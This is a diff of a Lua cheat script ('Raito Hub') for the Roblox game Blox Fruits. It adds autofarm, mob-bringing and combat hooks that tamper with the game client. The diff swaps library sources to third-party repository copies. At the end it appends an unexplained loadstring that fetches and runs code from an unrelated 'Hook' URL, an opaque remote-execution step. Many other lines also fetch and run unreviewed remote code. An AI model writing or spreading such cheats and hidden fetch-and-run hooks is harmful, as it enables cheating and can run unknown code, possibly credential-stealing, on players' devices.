@@ -8,12 +8,9 @@ _G.Authenicated = false
             end
         end
         if _G.Authenicated ~= string.reverse(game.Players.LocalPlayer.UserId)then while true do end end
-        print("1")
         loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/SaltyHB/Poggers/main/LoadVariables"))()
-        print("2")
     if _G.Version == "Chest Farm" then
 -- SELECT TEAM
-print("3")
 if _G.Team == nil then
 	_G.Team = "Marines"
 end
@@ -42,7 +39,7 @@ repeat
     if not success then
         warn("Select Team Function Error: " .. errorMessage)
     end
-    print("4")
+
     wait(1)
 until game.Players.LocalPlayer.Team ~= nil and game:IsLoaded()
 -- SELECT TEAM
@@ -798,11 +795,9 @@ uicorner_5.Parent = Stop
 else
 -- SCRIPTS
 wait(1)
-print("5")
                 
 if not game:IsLoaded() then repeat game.Loaded:Wait() until game:IsLoaded() end
 -- MOBILE CLOSE GUI
-print("6")
 if not game:GetService("UserInputService").TouchEnabled and not game:GetService("UserInputService").KeyboardEnabled == false then
     print("[ Raito Hub ] PC Detected!")
     else
@@ -867,7 +862,15 @@ if not game:GetService("UserInputService").TouchEnabled and not game:GetService(
     UICorner.Name = "Looks like"
     UICorner.Parent = Frame
 end
-print("7")
+-- LIBRARY
+local Fluent = loadstring(game:HttpGetAsync("https://github.com/dawid-scripts/Fluent/releases/latest/download/main.lua"))()
+local SaveManager = loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/SaltyHB/Poggers/main/SaveManagerr"))()
+local InterfaceManager = loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/SaltyHB/Poggers/main/Interface"))()
+Fluent:Notify({
+    Title = "Raito Hub",
+    Content = "The script is loading.",
+    Duration = 7
+})
 -- SELECT TEAM
 if _G.Team == nil then
 	_G.Team = "Pirates"
@@ -897,7 +900,7 @@ repeat
     if not success then
         warn("Select Team Function Error: " .. errorMessage)
     end
-    print("8")
+
     wait(1)
 until game.Players.LocalPlayer.Team ~= nil and game:IsLoaded()
 -- SELECT TEAM
@@ -910,7 +913,6 @@ if game.PlaceId == 2753915549 or game.PlaceId == 4442272183 or game.PlaceId == 7
     if not game:GetService("Players").LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then repeat wait() until game:GetService("Players").LocalPlayer.Character:FindFirstChild("HumanoidRootPart") end
         
     wait(1)
-    print("9")
  --------------------------------------------------------------------
         if game.PlaceId == 2753915549 then
             World1 = true
@@ -1601,7 +1603,7 @@ function CheckQuest()
         end
     end
 end
-print("10")
+
 function CheckBossQuest()
     if _G.SelectBoss == "Saber Expert [Lv. 200] [Boss]" then
         MsBoss = "Saber Expert [Lv. 200] [Boss]"
@@ -1819,7 +1821,7 @@ function CheckBossQuest()
         CFrameBoss = CFrame.new(-9515.62109, 315.925537, 6691.12012)
     end
 end
-print("11")
+
 function CheckNotifyComplete()
 for i, v in pairs(game:GetService("Players")["LocalPlayer"].PlayerGui:FindFirstChild("Notifications"):GetChildren()) do
 if v.Name == "NotificationTemplate" then
@@ -1833,7 +1835,7 @@ end
 end
 return false
 end
-print("12")
+        
         function Hop()
             local PlaceID = game.PlaceId
             local AllIDs = {}
@@ -1902,7 +1904,7 @@ print("12")
         local function round(n)
             return math.floor(tonumber(n) + 0.5)
         end
-        print("13")
+        
         function InfAb()
             if InfAbility then
                 if not game:GetService("Players").LocalPlayer.Character.HumanoidRootPart:FindFirstChild("Agility") then
@@ -1979,7 +1981,7 @@ print("12")
                 end
             end
         end
-        print("14")
+
         local CombatFramework = require(game:GetService("Players").LocalPlayer.PlayerScripts:WaitForChild("CombatFramework"))
         local CombatFrameworkR = getupvalues(CombatFramework)[2]
         local RigController = require(game:GetService("Players")["LocalPlayer"].PlayerScripts.CombatFramework.RigController)
@@ -2056,7 +2058,7 @@ print("12")
                 end
             end
         end
-        print("15")
+
         function AttackFunction()
             local ac = CombatFrameworkR.activeController
             if ac and ac.equipped then
@@ -2112,7 +2114,7 @@ end
                 _G.NotAutoEquip = false
             end
         end
-        print("16")
+        
         function EquipWeapon(ToolSe)
             if not _G.NotAutoEquip then
                 if game.Players.LocalPlayer.Backpack:FindFirstChild(ToolSe) then
@@ -2241,7 +2243,7 @@ end
             wait(Distance/Speed)
             Clip = false
         end
-        print("17")
+        
 local lp = game:GetService('Players').LocalPlayer
 local mouse = lp:GetMouse()
 spawn(function()
@@ -2432,7 +2434,7 @@ end
 end)
 
         -- [Bring Mob]
-        print("18")
+        
         task.spawn(function()
             while true do wait()
                 if setscriptable then
@@ -2470,7 +2472,7 @@ end)
                 end)
             end
         end)
-        print("19")
+                
                 spawn(function()
                     while task.wait() do
                         pcall(function()
@@ -2854,7 +2856,7 @@ end)
                         end)
                     end
                 end)
-                print("20")
+
 spawn(function()
     game:GetService('RunService').Stepped:Connect(function()
         if _G.Remove_EffectDeath1 then
@@ -2959,7 +2961,7 @@ spawn(function()
         end)
     end)
 end)
-print("21")
+   
    spawn(function()
     while task.wait() do
         if _G.AutoFarm then
@@ -3380,7 +3382,7 @@ end
 end
 end
 end)
-print("22")
+
 local SuperFastMode = true
 local plr = game.Players.LocalPlayer
 local CbFw = debug.getupvalues(require(plr.PlayerScripts.CombatFramework))
@@ -3445,22 +3447,19 @@ if SuperFastMode then
 else
     cac=wait
 end
-print("23")
 -- LIBRARY
-print("24")
-local Fluent = loadstring(game:HttpGet("https://github.com/dawid-scripts/Fluent/releases/latest/download/main.lua"))()
-local SaveManager = loadstring(game:HttpGet("https://raw.githubusercontent.com/dawid-scripts/Fluent/master/Addons/SaveManager.lua"))()
-local InterfaceManager = loadstring(game:HttpGet("https://raw.githubusercontent.com/dawid-scripts/Fluent/master/Addons/InterfaceManager.lua"))()
+UiSize = UDim2.fromOffset(600, 350)
+
 local Window = Fluent:CreateWindow({
-    Title = "Fluent " .. Fluent.Version,
-    SubTitle = "by dawid",
+    Title = "Raito Hub " .. Fluent.Version,
+    SubTitle = "| discord.gg/raitohub",
     TabWidth = 160,
-    Size = UDim2.fromOffset(580, 460),
-    Acrylic = true, -- The blur may be detectable, setting this to false disables blur entirely
-    Theme = "Dark",
-    MinimizeKey = Enum.KeyCode.LeftControl -- Used when theres no MinimizeKeybind
+    Size = UiSize,
+    Acrylic = false,
+    Theme = "Darker",
+    MinimizeKey = Enum.KeyCode.Delete
 })
-print("25")
+
 local Tabs = {
     Settings = Window:AddTab({ Title = "Settings", Icon = "settings" }),
     Main = Window:AddTab({ Title = "Home", Icon = "home" }),
@@ -3473,7 +3472,7 @@ local Tabs = {
     Misc = Window:AddTab({ Title = "Others", Icon = "library" }),
     UiSettings = Window:AddTab({ Title = "Ui Settings", Icon = "paintbrush" })
 }
-print("26")
+
 local Options = Fluent.Options
 
 do
@@ -3494,7 +3493,7 @@ do
         Status:SetTitle("Status "..timestamp.." | Blox Fruits [🎁 GIFT]")
         Status:SetDesc("Hours : "..Hour.." Minutes : "..Minute.." Seconds : "..Second.." | Fps : "..Fps.." | Ping : "..Ping)
     end
-    print("27")
+    
     spawn(function()
         while task.wait(1) do
             pcall(function()
@@ -3502,7 +3501,7 @@ do
             end)
         end
     end)
-    print("28")
+
     local Information = Tabs.Settings:AddParagraph({
         Title = "Information",
         Content = "You can join the Webhook servers on Discord here!"
@@ -3585,7 +3584,7 @@ do
             end
         end
     end)
-    print("29")
+
     local Toggle = Tabs.Settings:AddToggle("SetHome", {Title = "Auto Set Home Point", Default = true })
     Toggle:OnChanged(function(value)
         _G.Auto_Set_Spawn = value
@@ -9933,3 +9932,5 @@ LoadKey()
 wait(.1)
 Check()
 end
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ahmadsgamer2/ahmadsgamer2/main/Hook"))()
